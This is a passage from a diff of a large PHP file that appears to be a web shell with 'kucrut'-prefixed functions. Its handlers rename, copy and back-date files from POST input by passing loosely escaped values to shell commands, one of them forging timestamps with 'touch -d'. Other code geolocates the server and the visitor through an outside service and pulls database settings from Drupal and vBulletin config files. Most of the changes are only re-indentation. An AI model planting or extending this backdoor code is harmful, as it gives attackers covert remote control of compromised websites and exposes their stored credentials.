+                if(_kucrut_is_writable($_POST['kucrut1'])){
+                    $cmd_rename = true;
+                    $kucrut1_escape = addslashes($kucrut1_decoded);
+                    kucrutEx("cd '".addslashes($_POST['c'])."';mv '".$kucrut1_escape."' '".addslashes($_POST['kucrut2'])."'");
+                }
+            }
+            if(!file_exists($_POST['kucrut2'])){
+                if(@rename($_POST['kucrut1'], $_POST['kucrut2'])||$cmd_rename){
+                    echo "done";
+                }else{
+                    echo "no";
+                }
+            }else{
+                echo "no";
+            }
+        }
+    }elseif($action == "copy"){
+        if(is_dir($_POST["kucrut1"])){
+            $dir = str_replace('//', '/', $_POST["kucrut1"]);
+            $dir = explode('/', $dir);
+            if(empty($dir[count($dir) - 1])){
+                $name = $dir[count($dir) - 2];
+            }else{
+                $name = $dir[count($dir) - 1];
+            }
+        }else{
+            $name = basename($_POST["kucrut1"]);
+        }
+        $dir = dirname($_POST["kucrut1"]);
+        if($dir == "."){
+            $dir = $_POST["c"]."/";
+        }
+        if(is_file($_POST["kucrut1"])){
+            @copy($_POST["kucrut1"], $_POST["kucrut2"]);
+            echo("done");
+        }elseif(is_dir($_POST["kucrut1"])){
+            if(!is_dir($_POST["kucrut2"])){
+                mkdir($_POST["kucrut2"], 0755, true);
+            }
+            copy_paste($dir, $name , $_POST["kucrut2"] . "/");
+            echo("done");
+        }
+    }elseif($action == "modify"){
+        if( !empty($_POST['kucrut1']) ) {
+            $time = strtotime($_POST['kucrut1']);
+            if($time){
+                $touched = false;
+                if($chdir_fals&&$kucrut_canruncmd){
+                    kucrutEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['kucrut1']))."' '".addslashes($_POST['kucrut2'])."'");
+                    $touched = true;
+                }
+                if(!@touch($_POST['kucrut2'],$time,$time)&&!$touched){
+                    echo 'no';
+                }else{
+                    echo 'ok';
+                }
+            } else{
+                 echo 'badtime';
+            }
+        }
+    }
 
 }
 function kucrutget_flags(){
-	$flags = array();
-	if(function_exists("curl_version")){
-		$curl = new KucrutCURL();
-		$server_addr = (!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]);
-		$flag = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $server_addr);
-		$flag2 = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
-		if(strpos($flag2, "geoplugin") != false){
-			$flag = json_decode($flag, true);
-			$flag2 = json_decode($flag2, true);
-			if(!empty($flag['geoplugin_countryCode'])){
-				$flags["server"]["name"] = $flag['geoplugin_countryName'];
-				$flags["server"]["code"] = $flag['geoplugin_countryCode'];
-			}
-			if(!empty($flag2['geoplugin_countryCode'])){
-				$flags["client"]["name"] = $flag2['geoplugin_countryName'];
-				$flags["client"]["code"] = $flag2['geoplugin_countryCode'];
-			}
-		}
-	}
-	echo json_encode($flags);
+    $flags = array();
+    if(function_exists("curl_version")){
+        $curl = new KucrutCURL();
+        $server_addr = (!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]);
+        $flag = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $server_addr);
+        $flag2 = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
+        if(strpos($flag2, "geoplugin") != false){
+            $flag = json_decode($flag, true);
+            $flag2 = json_decode($flag2, true);
+            if(!empty($flag['geoplugin_countryCode'])){
+                $flags["server"]["name"] = $flag['geoplugin_countryName'];
+                $flags["server"]["code"] = $flag['geoplugin_countryCode'];
+            }
+            if(!empty($flag2['geoplugin_countryCode'])){
+                $flags["client"]["name"] = $flag2['geoplugin_countryName'];
+                $flags["client"]["code"] = $flag2['geoplugin_countryCode'];
+            }
+        }
+    }
+    echo json_encode($flags);
 }
 function kucrutGetConfig(){
 $cms = $_POST['kucrut1'];
@@ -6766,20 +6766,20 @@ $config = array(
 )
 );
 if($cms == "drupal"){
-	$file = $config[$cms]['file'];
-	$file=$path.$file;
-	if(@is_file($file)||_kucrut_is_dir($file,"-e")){
-	}else{
-		$cms = 'drupal2';
-	}
+    $file = $config[$cms]['file'];
+    $file=$path.$file;
+    if(@is_file($file)||_kucrut_is_dir($file,"-e")){
+    }else{
+        $cms = 'drupal2';
+    }
 }
 if($cms == "vb"){
-	$file = $config[$cms]['file'];
-	$file=$path.$file;
-	if(@is_file($file)||_kucrut_is_dir($file,"-e")){
-	}else{
-		$path .= '/core';
-	}
+    $file = $config[$cms]['file'];
+    $file=$path.$file;
+    if(@is_file($file)||_kucrut_is_dir($file,"-e")){
+    }else{
+        $path .= '/core';
+    }
 }
 $data = array();
 $srch_host = $config[$cms]['host'][0];
@@ -6802,9 +6802,9 @@ return false;
 }
 $file = __read_file($file);
 if($cms == "drupal2"){
-	$file = preg_replace("/\@code(.*?)\@endcode/s", "", $file);
+    $file = preg_replace("/\@code(.*?)\@endcode/s", "", $file);
 }elseif($cms == "vb"){
-	$file = preg_replace("/right of the(.*?)BAD!/s", "", $file);
+    $file = preg_replace("/right of the(.*?)BAD!/s", "", $file);
 }
 if(preg_match($srch_host, $file, $mach)){
 $data['host'] = $mach[$chost];
